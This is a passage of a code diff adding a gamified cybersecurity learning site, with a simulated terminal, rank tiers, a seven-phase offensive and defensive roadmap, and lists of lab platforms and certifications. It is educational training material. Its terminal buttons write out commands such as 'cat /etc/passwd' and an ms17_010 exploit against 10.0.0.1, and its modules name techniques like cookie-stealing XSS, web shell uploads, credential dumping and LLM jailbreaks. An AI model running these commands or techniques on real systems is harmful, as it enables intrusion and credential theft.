+      <button class="btn" onclick="termCmd('nmap 192.168.1.0/24')">nmap scan</button>
+      <button class="btn" onclick="termCmd('ls -la')">ls -la</button>
+      <button class="btn" onclick="termCmd('cat /etc/passwd')">cat /etc/passwd</button>
+      <button class="btn" onclick="termCmd('recon target.com')">recon</button>
+      <button class="btn" onclick="termCmd('scan --vuln')">vuln scan</button>
+      <button class="btn dr" onclick="termCmd('exploit --target 10.0.0.1 --module ms17_010')">exploit</button>
+    </div>
+  </section>
+
+  <!-- ===== ACHIEVEMENTS ===== -->
+  <section class="sec" id="sec-achievements">
+    <h1 class="stit">OPERATIVE BADGES</h1>
+    <p class="ssub">// UNLOCK BY COMPLETING MISSIONS AND REACHING MILESTONES</p>
+    <div class="achgr" id="achGrid"></div>
+  </section>
+</div>
+
+<script>
+// ================================================================
+//  CYBER NEXUS — Elite Operator Academy
+//  Architected & Debugged by Claude (Anthropic)
+// ================================================================
+
+// ----------------------------------------------------------------
+//  TERMINAL DOM REFS — must be declared before any usage
+// ----------------------------------------------------------------
+const tScr = document.getElementById('tScr');
+const tIn  = document.getElementById('tIn');
+const commandHistory = [];
+let historyIndex = -1;
+
+// ================================================================
+//  DATA
+// ================================================================
+const RANKS=[
+  {min:0,title:'Script Kiddie',color:'#94a3b8',icon:'👾'},
+  {min:300,title:'Code Runner',color:'#22c55e',icon:'💻'},
+  {min:800,title:'Net Stalker',color:'#06b6d4',icon:'🕸️'},
+  {min:1500,title:'SOC Initiate',color:'#3b82f6',icon:'🛡️'},
+  {min:3000,title:'Junior Operator',color:'#8b5cf6',icon:'🎯'},
+  {min:5500,title:'Cloud Sentinel',color:'#a855f7',icon:'☁️'},
+  {min:9000,title:'Shadow Analyst',color:'#ec4899',icon:'🔍'},
+  {min:14000,title:'Red Team Specialist',color:'#ef4444',icon:'⚔️'},
+  {min:21000,title:'Threat Hunter',color:'#f97316',icon:'🎯'},
+  {min:30000,title:'Cyber Ronin',color:'#eab308',icon:'⚡'},
+  {min:42000,title:'Ghost Operator',color:'#00e5ff',icon:'👻'},
+  {min:58000,title:'Zero-Day Phantom',color:'#bf00ff',icon:'💀'},
+  {min:80000,title:'Elite Security Architect',color:'#ffd700',icon:'🏆'},
+];
+
+const ROADMAP=[
+  {id:'ph1',phase:'PHASE 01',name:'Foundations',difficulty:'Beginner',color:'#00e5ff',icon:'🛠️',
+   desc:'Master Linux, Networking, Python, and Web fundamentals. The bedrock of every elite operator.',
+   weeks:[
+    {title:'Week 1-2 — Linux & Networking Core',modules:[
+      {id:'p1m1',title:'Linux Filesystem & Terminal',xp:50,
+       topics:['Linux filesystem hierarchy (FHS)','pwd/ls/cd/mkdir/chmod/chown','File permissions & ownership','Root vs user accounts'],
+       tasks:['Navigate entire filesystem via terminal only','Create hacking toolkit folder structure','Practice chmod on 10 different files'],
+       labs:['Linux Journey (free)','OverTheWire: Bandit 1-5','TryHackMe: Linux Fundamentals 1']},
+      {id:'p1m2',title:'Terminal Power Tools',xp:50,
+       topics:['grep, find, awk, sed','cat, less, tail, head','Piping and redirection','Process management: ps, kill, top, htop'],
+       tasks:['Search for a string across all /etc files','Build your first bash one-liner','Kill a process by name without PID'],
+       labs:['OverTheWire: Bandit 6-12','Linux Journey: Advanced','TryHackMe: Linux Fundamentals 2']},
+      {id:'p1m3',title:'Bash Scripting Basics',xp:75,
+       topics:['Variables and data types','for/while loops','if/else conditionals','Functions and arguments','Script permissions'],
+       tasks:['Write auto-recon folder creator script','Automate file backup with bash','Build a basic port knock script'],
+       labs:['OverTheWire: Bandit 13-20','HackTheBox: Bash Intro','TryHackMe: Scripting']},
+      {id:'p1m4',title:'Networking Fundamentals',xp:75,
+       topics:['OSI model (all 7 layers)','TCP/IP stack and protocols','IP addressing and subnetting /CIDR','DNS resolution & record types'],
+       tasks:['Subnet a /24 manually on paper','Trace a packet with Wireshark','Map your home network topology'],
+       labs:['Cisco Skills For All: Networking','TryHackMe: Pre-Security path','Wireshark packet analysis lab']},
+      {id:'p1m5',title:'HTTP & Web Architecture',xp:75,
+       topics:['HTTP methods: GET, POST, PUT, DELETE, PATCH','Request/Response cycle in depth','Headers, cookies, sessions, tokens','HTTPS, TLS handshake, certificates'],
+       tasks:['Intercept 10 requests with browser DevTools','Compare GET vs POST parameters in Burp','Analyze cookie attributes (HttpOnly, Secure, SameSite)'],
+       labs:['PortSwigger: HTTP Basics','Chrome DevTools practice','TryHackMe: How The Web Works']},
+    ]},
+    {title:'Week 3 — Python, Burp Suite & Lab Setup',modules:[
+      {id:'p1m6',title:'Python for Security',xp:100,
+       topics:['Python basics: variables, loops, functions','requests library for HTTP','socket programming basics','File I/O and string manipulation'],
+       tasks:['Write a port scanner in Python','Build a password generator script','Create HTTP request automation script'],
+       labs:['PicoCTF Python challenges','FreeCodeCamp Python','HackTheBox: Python scripting']},
+      {id:'p1m7',title:'Burp Suite Setup & Proxy',xp:100,
+       topics:['Burp Suite Community installation','Proxy configuration & browser setup','Intercepting/forwarding HTTP traffic','SSL certificate installation for HTTPS'],
+       tasks:['Intercept login request on DVWA','Modify POST parameter to bypass auth','Forward 20 requests manually'],
+       labs:['PortSwigger: Burp Suite Essentials','OWASP Juice Shop setup','DVWA installation and setup']},
+      {id:'p1m8',title:'Burp Suite: Repeater, Intruder & Decoder',xp:100,
+       topics:['Repeater: replaying and modifying requests','Intruder: automated fuzzing payload types','Decoder: base64/URL/hex encoding','Comparer: diff two responses'],
+       tasks:['Brute-force DVWA login with Intruder','Fuzz parameters to find hidden endpoints','Decode intercepted JWT in Decoder'],
+       labs:['PortSwigger: Burp Suite Labs (all free)','DVWA Brute Force Challenge','Juice Shop with Burp Suite']},
+      {id:'p1m9',title:'Virtual Lab & Tool Setup',xp:75,
+       topics:['VirtualBox/VMware setup','Kali Linux installation','Network adapter types (NAT, Host-Only, Bridged)','Installing Metasploitable 2 & DVWA'],
+       tasks:['Set up Kali Linux VM with snapshots','Configure isolated Host-Only lab network','Install all lab targets in VMs'],
+       labs:['TryHackMe: Starting Out in Cyber','VulnHub: Metasploitable 2','DVWA local installation']},
+    ]},
+  ]},
+  {id:'ph2',phase:'PHASE 02',name:'Web Exploitation',difficulty:'Intermediate',color:'#ffd700',icon:'🕸️',
+   desc:'Master OWASP Top 10, injection attacks, authentication flaws, JWT/OAuth, and API hacking.',
+   weeks:[
+    {title:'Week 4-5 — OWASP Top 10 Core',modules:[
+      {id:'p2m1',title:'SQL Injection (SQLi)',xp:150,
+       topics:['SQL injection fundamentals','Error-based, Blind, Time-based SQLi','UNION-based data extraction','SQLmap automation tool'],
+       tasks:['Exploit SQLi on DVWA (all security levels)','Extract database schema manually','Bypass login with SQL tautology'],
+       labs:['PortSwigger: SQL Injection (18 labs)','DVWA SQLi','HackTheBox web challenges']},
+      {id:'p2m2',title:'Cross-Site Scripting (XSS)',xp:150,
+       topics:['Reflected, Stored, DOM-based XSS','Cookie theft payloads','CSP bypass techniques','XSS to CSRF escalation'],
+       tasks:['Build cookie-stealing XSS payload','Bypass WAF with obfuscated XSS','Test all DVWA XSS levels'],
+       labs:['PortSwigger: XSS Labs (30 labs)','OWASP Juice Shop XSS','Google Gruyere (free)']},
+      {id:'p2m3',title:'Authentication & Session Attacks',xp:150,
+       topics:['Credential stuffing & brute force','Session fixation & hijacking','Password reset poisoning','Multi-factor auth bypass'],
+       tasks:['Exploit weak password reset on Juice Shop','Session fixation demo in DVWA','Build credential stuffing wordlist'],
+       labs:['PortSwigger: Authentication Labs','HackTheBox: Auth challenges','TryHackMe: Burp Suite Advanced']},
+      {id:'p2m4',title:'IDOR & Broken Access Control',xp:150,
+       topics:['IDOR (Insecure Direct Object Reference)','Horizontal vs Vertical privilege escalation','Forced browsing hidden resources','Parameter tampering techniques'],
+       tasks:['Access other users data via IDOR in Juice Shop','Escalate from user to admin','Test all access control bypass techniques'],
+       labs:['PortSwigger: IDOR & Access Control Labs','Juice Shop IDOR','PentesterLab: IDOR exercises']},
+      {id:'p2m5',title:'CSRF, SSRF & XXE',xp:175,
+       topics:['CSRF attacks and token bypass','SSRF: internal service enumeration','XXE: file read via XML injection','Blind SSRF via out-of-band'],
+       tasks:['Craft CSRF payload to change email','SSRF to hit EC2 metadata service','XXE to read /etc/passwd'],
+       labs:['PortSwigger: CSRF Labs (12 labs)','PortSwigger: SSRF Labs','PortSwigger: XXE Labs']},
+      {id:'p2m6',title:'File Upload & Path Traversal',xp:175,
+       topics:['Unrestricted file upload attacks','Extension bypass techniques','Path/directory traversal (../)','Zip slip attacks'],
+       tasks:['Upload web shell bypassing upload filter','Read /etc/passwd via traversal','Exploit zip slip vulnerability'],
+       labs:['PortSwigger: File Upload Labs','DVWA File Upload','HackTheBox file challenges']},
+    ]},
+    {title:'Week 6-7 — JWT, OAuth & API Security',modules:[
+      {id:'p2m7',title:'JWT Attacks',xp:200,
+       topics:['JWT structure: header.payload.signature','Algorithm confusion (RS256→HS256)','None algorithm exploit','JWT secret brute-forcing'],
+       tasks:['Forge admin JWT by changing alg to none','Crack weak JWT secret with hashcat','Exploit JWT key confusion attack'],
+       labs:['PortSwigger: JWT Attacks Labs','crAPI JWT challenges','jwt.io for analysis tool']},
+      {id:'p2m8',title:'OAuth 2.0 Attacks',xp:200,
+       topics:['OAuth 2.0 authorization code flow','Open redirect in redirect_uri','State parameter bypass','Token hijacking via referrer'],
+       tasks:['Exploit OAuth open redirect for code theft','Bypass state parameter CSRF protection','Steal access token via referrer leak'],
+       labs:['PortSwigger: OAuth Labs','crAPI OAuth challenges','TryHackMe: OAuth module']},
+      {id:'p2m9',title:'API Security Testing',xp:200,
+       topics:['REST API architecture & methods','Mass assignment vulnerability','Rate limiting bypass techniques','GraphQL introspection & injection'],
+       tasks:['Exploit mass assignment in crAPI','Enumerate hidden API endpoints','Test GraphQL for introspection enabled'],
+       labs:['crAPI (Completely Ridiculous API)','Damn Vulnerable APIs (OWASP)','GraphQLGoat']},
+    ]},
+  ]},
+  {id:'ph3',phase:'PHASE 03',name:'Cloud Security',difficulty:'Intermediate',color:'#4488ff',icon:'☁️',
+   desc:'Conquer AWS, Azure, and GCP security. IAM mastery, cloud misconfigs, and cloud pentesting.',
+   weeks:[
+    {title:'Week 8-9 — AWS Security',modules:[
+      {id:'p3m1',title:'AWS IAM & Fundamentals',xp:200,
+       topics:['AWS shared responsibility model','IAM users, roles, policies, groups','Principle of least privilege','Access keys vs IAM roles & instance profiles'],
+       tasks:['Create least-privilege IAM policies','Set up MFA on root and IAM accounts','Audit an IAM policy for over-permissions'],
+       labs:['Flaws.cloud (free AWS challenges)','IAM Vulnerable (open source)','AWS Free Tier labs']},
+      {id:'p3m2',title:'S3 Security & Data Exposure',xp:200,
+       topics:['S3 bucket ACLs and bucket policies','Public vs private access settings','S3 enumeration via awscli','Sensitive data in public buckets'],
+       tasks:['Find public S3 buckets with awscli enumerate','Exploit misconfigured bucket in Flaws.cloud','Analyze bucket policy for over-permissions'],
+       labs:['Flaws.cloud levels 1-5','CloudGoat S3 scenarios','AWS Security Hub workshop']},
+      {id:'p3m3',title:'AWS Monitoring: GuardDuty, CloudTrail, Security Hub',xp:225,
+       topics:['CloudTrail: API activity logging','GuardDuty: ML-powered threat detection','Security Hub: centralized findings','CloudWatch alarms for security events'],
+       tasks:['Enable GuardDuty and generate sample findings','Analyze CloudTrail for suspicious root activity','Build CloudWatch alarm for root login'],
+       labs:['AWS Security Hub workshop','CloudGoat detection evasion path','TryHackMe: AWS Security']},
+      {id:'p3m4',title:'AWS Pentesting Techniques',xp:250,
+       topics:['AWS enumeration with Pacu & awscli','IAM privilege escalation techniques','SSRF to EC2 Instance Metadata Service','Lambda and ECS abuse techniques'],
+       tasks:['Enumerate AWS environment with Pacu','Escalate privileges via iam:PassRole','SSRF to hit v1 metadata endpoint for credentials'],
+       labs:['CloudGoat (Rhino Security Labs)','AWSGoat (INE Labs)','Pacu AWS exploitation framework']},
+    ]},
+    {title:'Week 10-11 — Azure, GCP & Containers',modules:[
+      {id:'p3m5',title:'Azure Security Fundamentals',xp:200,
+       topics:['Azure AD (Entra ID) identity model','RBAC roles and assignment scopes','Microsoft Defender for Cloud','Azure Sentinel: cloud-native SIEM'],
+       tasks:['Configure Azure AD with Conditional Access','Assign RBAC with least privilege','Enable Defender for Cloud on subscription'],
+       labs:['AzureGoat (INE Labs)','Microsoft Defender labs (free)','TryHackMe: Azure fundamentals']},
+      {id:'p3m6',title:'GCP Security',xp:200,
+       topics:['GCP IAM: service accounts and roles','Security Command Center findings','VPC Service Controls & Org Policies','Cloud Armor WAF configuration'],
+       tasks:['Enumerate GCP resources via gcloud','Analyze service account permissions','Configure VPC firewall deny-all baseline'],
+       labs:['GCP Security Skills Boost (free coupons)','GCP Security Command Center lab','TryHackMe: GCP fundamentals']},
+      {id:'p3m7',title:'Container & Kubernetes Security',xp:250,
+       topics:['Docker security best practices','Kubernetes RBAC and service accounts','Pod Security Admission / PSPs','Network policies and namespace isolation'],
+       tasks:['Audit a Dockerfile for vulnerabilities','Escape a privileged container','Exploit K8s RBAC misconfiguration for cluster-admin'],
+       labs:['Kubernetes Goat (Madhu Akula)','KubeHound','TryHackMe: Kubernetes for security']},
+    ]},
+  ]},
+  {id:'ph4',phase:'PHASE 04',name:'Offensive Security',difficulty:'Advanced',color:'#ff4444',icon:'⚔️',
+   desc:'Full red team operator training. Recon, exploitation, post-exploitation, and attack chaining.',
+   weeks:[
+    {title:'Week 12-13 — Recon & Scanning',modules:[
+      {id:'p4m1',title:'Passive & Active Recon',xp:300,
+       topics:['OSINT: LinkedIn, GitHub, crt.sh dorking','Subdomain enumeration: amass, subfinder, assetfinder','Shodan, Censys, FOFA operators','JavaScript file mining for endpoints'],
+       tasks:['Enumerate all subdomains of a bug bounty target','Google dork to find exposed admin panels','Mine JS files for API keys and endpoints'],
+       labs:['TryHackMe: Passive Recon','Hacker101: Recon module','HackTheBox Recon labs']},
+      {id:'p4m2',title:'Nmap & Network Scanning',xp:250,
+       topics:['Nmap scan types: SYN, TCP, UDP, ACK','Service and version detection (-sV)','OS fingerprinting (-O)','NSE scripting engine for vulnerability detection'],
+       tasks:['Perform full Nmap scan on Metasploitable','Detect vulnerable services using NSE vuln category','Map a network topology from scan results'],
+       labs:['TryHackMe: Nmap room','HackTheBox network challenges','Metasploitable 2 scanning practice']},
+      {id:'p4m3',title:'Metasploit Framework',xp:300,
+       topics:['Metasploit architecture: modules, payloads, encoders','Searching and configuring exploits','Meterpreter shell: navigation, upload, download','Post-exploitation and persistence modules'],
+       tasks:['Exploit 5 Metasploitable services with MSF','Establish persistence with Meterpreter','Dump credential hashes post-exploitation'],
+       labs:['TryHackMe: Metasploit rooms','VulnHub: Metasploitable 2','HackTheBox beginner machines']},
+    ]},
+    {title:'Week 14-16 — Privilege Escalation & Advanced Exploitation',modules:[
+      {id:'p4m4',title:'Linux Privilege Escalation',xp:350,
+       topics:['SUID/SGID binary exploitation','Sudo misconfiguration abuse (sudoers)','Cron job path/wildcard injection','Writable PATH exploitation','NFS no_root_squash'],
+       tasks:['Find and exploit SUID binary','Escalate via misconfigured sudo cron job','Use 5 different privesc techniques on one machine'],
+       labs:['TryHackMe: Linux PrivEsc','HackTheBox privesc machines','Root-Me Linux challenges']},
+      {id:'p4m5',title:'Windows Privilege Escalation',xp:350,
+       topics:['Unquoted service paths','DLL hijacking and search order','Token impersonation (PrintSpoofer, JuicyPotato)','AlwaysInstallElevated registry abuse','Credential dumping with mimikatz'],
+       tasks:['Exploit unquoted service path to SYSTEM','Use mimikatz to dump NTLM hashes','Token impersonation for SYSTEM shell'],
+       labs:['TryHackMe: Windows PrivEsc','HackTheBox Windows machines','VulnHub Windows targets']},
+      {id:'p4m6',title:'Active Directory Attacks',xp:400,
+       topics:['AD architecture: forests, trusts, OUs','Kerberoasting service account hashes','Pass-the-Hash and Pass-the-Ticket','BloodHound for attack path visualization','DCSync to extract all domain hashes'],
+       tasks:['Kerberoast all service accounts in lab','Build attack path to Domain Admin via BloodHound','Perform DCSync from compromised domain account'],
+       labs:['TryHackMe: Active Directory','HackTheBox: AD machines','VulnHub AD labs']},
+      {id:'p4m7',title:'Advanced Web: SSRF, Race Conditions, HTTP Smuggling',xp:500,
+       topics:['Advanced SSRF chains (SSRF→RCE via cloud metadata)','Race condition exploitation techniques','HTTP request smuggling: CL.TE and TE.CL','Web cache poisoning attacks'],
+       tasks:['Chain SSRF to RCE via AWS credentials in metadata','Exploit race condition for free premium access','HTTP smuggling to poison shared cache'],
+       labs:['PortSwigger: Advanced Topics','HackTheBox advanced web machines','PentesterLab Advanced Web']},
+    ]},
+  ]},
+  {id:'ph5',phase:'PHASE 05',name:'Defensive Security',difficulty:'Advanced',color:'#00ff88',icon:'🛡️',
+   desc:'Blue team operations: SIEM, threat hunting, DFIR, malware analysis, and detection engineering.',
+   weeks:[
+    {title:'Week 17-18 — SOC, SIEM & Threat Hunting',modules:[
+      {id:'p5m1',title:'SOC Operations & SIEM Fundamentals',xp:300,
+       topics:['SOC tiers: L1/L2/L3 analyst roles','SIEM platforms: Splunk, ELK, Microsoft Sentinel','Log sources: Windows Events, Syslog, NetFlow','Alert triage and escalation workflows'],
+       tasks:['Analyze 50 log entries for IOCs manually','Create a SIEM correlation rule for brute force','Triage 10 sample security alerts and classify'],
+       labs:['LetsDefend: SOC Analyst learning path','CyberDefenders: Blue Team Labs Online','TryHackMe: SOC Level 1 path']},
+      {id:'p5m2',title:'Threat Hunting & MITRE ATT&CK',xp:300,
+       topics:['Threat hunting methodologies (hypothesis-driven)','Sigma rules: vendor-agnostic detection','MITRE ATT&CK framework navigation','KQL/SPL queries for hunting'],
+       tasks:['Write 3 Sigma detection rules for common TTPs','Hunt for lateral movement in mock SIEM logs','Map attacker TTPs to MITRE ATT&CK techniques'],
+       labs:['CyberDefenders: Threat hunting labs','Blue Team Labs Online','TryHackMe: Threat Hunting rooms']},
+      {id:'p5m3',title:'Digital Forensics & Incident Response (DFIR)',xp:350,
+       topics:['Incident response: PICERL phases','Memory forensics with Volatility 3','Disk forensics with Autopsy/FTK Imager','Timeline reconstruction from logs and artifacts'],
+       tasks:['Analyze memory dump: find injected processes','Extract deleted files from disk image with Autopsy','Reconstruct 4-hour breach timeline from logs'],
+       labs:['CyberDefenders: DFIR challenges','TryHackMe: DFIR path','Blue Team Labs: Incident Response']},
+      {id:'p5m4',title:'Malware Analysis & YARA',xp:350,
+       topics:['Static analysis: strings, PE headers, imports','Dynamic analysis in sandboxes','IOC extraction: domains, IPs, file hashes','YARA rule syntax and writing'],
+       tasks:['Analyze malware sample statically with PEstudio','Run sample in ANY.RUN free sandbox','Write YARA rule that detects a specific malware family'],
+       labs:['TryHackMe: Malware Analysis','ANY.RUN free sandbox','MalwareBazaar sample repository']},
+    ]},
+  ]},
+  {id:'ph6',phase:'PHASE 06',name:'DevSecOps',difficulty:'Advanced',color:'#9d00ff',icon:'⚙️',
+   desc:'Shift security left. Secure CI/CD pipelines, containers, IaC, and software supply chains.',
+   weeks:[
+    {title:'Week 19-20 — Secure CI/CD, SAST/DAST & IaC',modules:[
+      {id:'p6m1',title:'GitHub Actions & CI/CD Security',xp:300,
+       topics:['GitHub Actions attack surface analysis','Workflow injection via user-controlled input','Secret management: GitHub Secrets vs Vault','OIDC for cloud provider authentication'],
+       tasks:['Identify and exploit vulnerable GitHub Actions workflow','Implement OIDC with AWS to replace static keys','Audit 3 public GitHub Action workflows for issues'],
+       labs:['Pwn Actions (vulnerable GitHub Actions repo)','HackTheBox: DevSecOps challenges','GitHub Advanced Security workshop']},
+      {id:'p6m2',title:'SAST, DAST & Secret Scanning',xp:300,
+       topics:['SAST tools: Semgrep, CodeQL, Bandit','DAST tools: OWASP ZAP, Nuclei','Secret scanning: truffleHog, gitleaks, git-secrets','Dependency scanning: Trivy, Snyk, OWASP Dependency-Check'],
+       tasks:['Run Semgrep on a vulnerable NodeGoat application','Set up OWASP ZAP baseline scan in CI/CD','Find secrets leaked in git history with gitleaks'],
+       labs:['Semgrep playground (free)','OWASP WebGoat','GitHub Advanced Security: secret scanning']},
+      {id:'p6m3',title:'Terraform & IaC Security',xp:300,
+       topics:['Terraform security best practices','IaC security scanning: Checkov, tfsec, Terrascan','Terraform state file exposure risks','Preventing cloud misconfigurations at commit time'],
+       tasks:['Scan TerraGoat with Checkov: fix 5 critical findings','Implement pre-commit hooks for IaC scanning','Review Terraform state for exposed secrets'],
+       labs:['TerraGoat (Bridgecrew - intentionally vulnerable Terraform)','Checkov documentation labs','CloudGoat IaC scenarios']},
+      {id:'p6m4',title:'Supply Chain Security & SBOMs',xp:350,
+       topics:['Software Bill of Materials (SBOM) generation','Dependency confusion attacks','Container image signing with Sigstore/Cosign','OpenSSF Scorecard for open source projects'],
+       tasks:['Generate SBOM for a project with Syft','Detect vulnerable dependencies with Grype/Trivy','Sign and verify a container image with Cosign'],
+       labs:['Sigstore policy controller lab','Socket.dev dependency analysis','HackTheBox supply chain challenges']},
+    ]},
+  ]},
+  {id:'ph7',phase:'PHASE 07',name:'AI & Automation',difficulty:'Expert',color:'#ff44cc',icon:'🤖',
+   desc:'The future of security. AI-powered SOC, LLM attacks, Python automation, and AI agent red teaming.',
+   weeks:[
+    {title:'Week 21-23 — AI Security & Security Automation',modules:[
+      {id:'p7m1',title:'Security Automation with Python',xp:400,
+       topics:['Python security libraries: scapy, impacket, pyOpenSSL','Automated recon tool building','Custom exploit scripting patterns','Log analysis and IOC extraction automation'],
+       tasks:['Build automated subdomain enum tool with concurrent requests','Create custom port scanner with banner grabbing','Write a log parser that extracts IOCs and enriches with VirusTotal API'],
+       labs:['PicoCTF scripting challenges','HackTheBox scripting labs','PortSwigger custom Burp extensions']},
+      {id:'p7m2',title:'LLM Security & Prompt Injection',xp:450,
+       topics:['Prompt injection attacks (direct & indirect)','Jailbreaking LLMs: techniques and defenses','LLM data exfiltration via conversation','OWASP LLM Top 10 vulnerabilities','Secure LLM application deployment'],
+       tasks:['Perform prompt injection on Gandalf AI challenge','Build a simple LangChain app and test for injection','Test 5 jailbreak techniques on a public LLM'],
+       labs:['Gandalf by Lakera AI (free)','Prompt injection CTF challenges','OWASP LLM Top 10 lab scenarios']},
+      {id:'p7m3',title:'AI-Powered SOC & Detection Automation',xp:450,
+       topics:['Local LLMs for log analysis (Ollama)','LangChain security agent patterns','CrewAI for multi-agent SOC automation','AI-assisted threat hunting workflows'],
+       tasks:['Run Ollama locally with llama3 for log analysis','Build LangChain agent for automated CVE lookup and triage','Create CrewAI workflow for alert classification'],
+       labs:['Ollama local setup guide','LangChain documentation and cookbook','Open-source AI security projects on GitHub']},
+      {id:'p7m4',title:'Elite Bug Bounty & Vulnerability Research',xp:500,
+       topics:['Advanced bug bounty methodology','Vulnerability chaining for higher impact','P1/P2 finding patterns and attack scenarios','Professional PoC report writing','Hall of Fame tactics and responsible disclosure'],
+       tasks:['Submit first bug bounty report (any platform)','Chain 2 vulnerabilities for greater impact than each alone','Write a professional PoC report with CVSS scoring'],
+       labs:['HackerOne (bug bounty platform)','Bugcrowd (bug bounty platform)','Intigriti (bug bounty platform)','YesWeHack']},
+    ]},
+  ]},
+];
+
+const ACADEMY=[
+  {name:'Linux Journey',icon:'🐧',url:'https://linuxjourney.com',level:'Beginner',
+   desc:'Free gamified Linux learning platform. Perfect for building terminal confidence from absolute zero. Interactive exercises and challenges.',
+   tags:['lin'],xp:200,order:0},
+  {name:'TryHackMe',icon:'🧠',url:'https://tryhackme.com',level:'Beginner–Intermediate',
+   desc:'The best starting point for beginners. Guided learning paths with browser-based hacking machines. Huge community and structured curriculum.',
+   tags:['off','def','cld'],xp:400,order:1},
+  {name:'OverTheWire',icon:'🏴',url:'https://overthewire.org/wargames',level:'Beginner',
+   desc:'Classic wargame series. Bandit is the perfect Linux terminal introduction. Narnia, Leviathan, Natas cover web and binary exploitation.',
+   tags:['lin','off'],xp:300,order:2},
+  {name:'PortSwigger Web Security Academy',icon:'🕷️',url:'https://portswigger.net/web-security',level:'All Levels',
+   desc:'The definitive free web security resource. 200+ interactive labs covering every OWASP vulnerability class. Curated by Burp Suite creators.',
+   tags:['web','off'],xp:600,order:3},
+  {name:'PicoCTF',icon:'🏁',url:'https://picoctf.org',level:'Beginner–Intermediate',
+   desc:'Carnegie Mellon-backed CTF platform. Perfect for beginners learning cryptography, forensics, reverse engineering, web, and binary exploitation.',
+   tags:['ctf','web'],xp:350,order:4},
+  {name:'Hacker101',icon:'🎯',url:'https://hacker101.com',level:'Beginner–Intermediate',
+   desc:'HackerOne free hacking curriculum with CTFs that earn you private bug bounty invitations. Best path to starting real bug bounty programs.',
+   tags:['web','off','ctf'],xp:400,order:5},
+  {name:'OWASP Juice Shop',icon:'🥤',url:'https://owasp.org/www-project-juice-shop',level:'Beginner–Advanced',
+   desc:'Most modern intentionally vulnerable web application. Covers all OWASP Top 10 and ASVS. Runs locally or in cloud. Gamified scoreboard.',
+   tags:['web','off'],xp:400,order:6},
+  {name:'Hack The Box',icon:'⬡',url:'https://hackthebox.com',level:'Intermediate–Expert',
+   desc:'The premier hacking platform with realistic machines and challenges. Highly respected by industry professionals. Required for serious pentesters.',
+   tags:['off','web','ctf'],xp:500,order:7},
+  {name:'Root-Me',icon:'🌿',url:'https://root-me.org',level:'Intermediate',
+   desc:'Thousands of challenges across all security domains. Excellent for web exploitation, system hacking, cryptography, and network challenges.',
+   tags:['off','web'],xp:400,order:8},
+  {name:'VulnHub',icon:'💾',url:'https://vulnhub.com',level:'Intermediate',
+   desc:'Downloadable vulnerable VMs for offline practice. Hundreds of machines ranging from beginner to expert. Great for OSCP preparation.',
+   tags:['off'],xp:350,order:9},
+  {name:'PentesterLab',icon:'💻',url:'https://pentesterlab.com',level:'Intermediate',
+   desc:'Focused web security exercises with bootcamps on specific vulnerability classes. Free tier covers essential topics with great depth.',
+   tags:['web','off'],xp:400,order:10},
+  {name:'LetsDefend',icon:'🔵',url:'https://letsdefend.io',level:'Beginner–Intermediate',
+   desc:'Realistic SOC simulator platform. Triage real security alerts, analyze malicious emails, investigate incidents like a real SOC analyst.',
+   tags:['def'],xp:400,order:11},
+  {name:'CyberDefenders',icon:'🛡️',url:'https://cyberdefenders.org',level:'Intermediate',
+   desc:'Blue team focused platform with realistic DFIR and threat hunting labs using real malware samples and attack data from actual incidents.',
+   tags:['def','ctf'],xp:450,order:12},
+  {name:'Blue Team Labs Online',icon:'🔷',url:'https://blueteamlabs.online',level:'Beginner–Intermediate',
+   desc:'Free investigations and challenges focused on defensive security, log analysis, and security operations. Excellent for SOC skill building.',
+   tags:['def','ctf'],xp:350,order:13},
+  {name:'Flaws.cloud',icon:'⚡',url:'http://flaws.cloud',level:'Beginner–Intermediate',
+   desc:"Scott Piper's iconic free AWS security challenges. Learn by exploiting a real vulnerable AWS environment. flaws2.cloud covers attacker vs defender.",
+   tags:['cld','off'],xp:400,order:14},
+  {name:'CloudGoat',icon:'☁️',url:'https://github.com/RhinoSecurityLabs/cloudgoat',level:'Advanced',
+   desc:'Rhino Security Labs vulnerable-by-design AWS environment. Scenario-based cloud pentesting challenges with progressive difficulty.',
+   tags:['cld','off'],xp:500,order:15},
+  {name:'AWSGoat',icon:'🐐',url:'https://github.com/ine-labs/AWSGoat',level:'Intermediate–Advanced',
+   desc:'Vulnerable AWS infrastructure with two real-world attack scenarios covering IAM, S3, Lambda, and more. Terraform deployable.',
+   tags:['cld','off'],xp:450,order:16},
+  {name:'Kubernetes Goat',icon:'🐳',url:'https://madhuakula.com/kubernetes-goat',level:'Advanced',
+   desc:'Interactive Kubernetes security learning platform. Covers container escapes, privilege escalation, network policies, and supply chain attacks.',
+   tags:['cld','def'],xp:500,order:17},
+  {name:'Damn Vulnerable APIs (crAPI)',icon:'🔌',url:'https://github.com/OWASP/crAPI',level:'Intermediate',
+   desc:'OWASP crAPI (Completely Ridiculous API) - a full vulnerable REST and GraphQL API app for practicing OWASP API Security Top 10 attacks.',
+   tags:['web','off'],xp:400,order:18},
+  {name:'CTFtime',icon:'🏆',url:'https://ctftime.org',level:'All Levels',
+   desc:'The global CTF competition calendar. Compete in worldwide competitions to sharpen skills, build reputation, and join elite CTF teams.',
+   tags:['ctf'],xp:300,order:19},
+];
+
+const CERTS=[
+  {name:'CompTIA Security+',short:'SEC+',color:'#ef4444',diff:'Beginner',time:'3–4 months',
+   domains:['Threats & Vulnerabilities','Technologies & Tools','Architecture & Design','Identity & Access Mgmt','Risk Management'],
+   prereqs:'Basic IT knowledge',
+   desc:'The industry entry-level standard. Required for US DoD positions and most enterprise security roles. Validates core security fundamentals.'},
+  {name:'INE eJPT',short:'eJPT',color:'#f97316',diff:'Beginner',time:'1–2 months',
+   domains:['Networking Fundamentals','Web App Testing','Penetration Testing Process','Report Writing'],
+   prereqs:'Basic Linux & Networking',
+   desc:"INE's entry-level pentesting cert. Fully practical hands-on exam. Highly recommended as your first offensive certification."},
+  {name:'TCM PNPT',short:'PNPT',color:'#22c55e',diff:'Intermediate',time:'3–6 months',
+   domains:['OSINT Recon','External Pentest','Internal AD Pentest','Reporting & Debrief'],
+   prereqs:'Basic hacking skills',
+   desc:"TCM Security's practical pentest certification. Real-world pentest against a mock corporation. Community-respected, more affordable than OSCP."},
+  {name:'CEH',short:'CEH',color:'#eab308',diff:'Intermediate',time:'3–4 months',
+   domains:['Recon & Footprinting','Scanning Networks','Enumeration','Exploitation','Web Hacking','Cloud Security'],
+   prereqs:'Security+ or 2yr experience',
+   desc:'EC-Council Certified Ethical Hacker. Broad theoretical and practical coverage. Widely recognized in enterprise and government sectors.'},
+  {name:'AWS Security Specialty',short:'AWS-SEC',color:'#f97316',diff:'Intermediate–Advanced',time:'4–6 months',
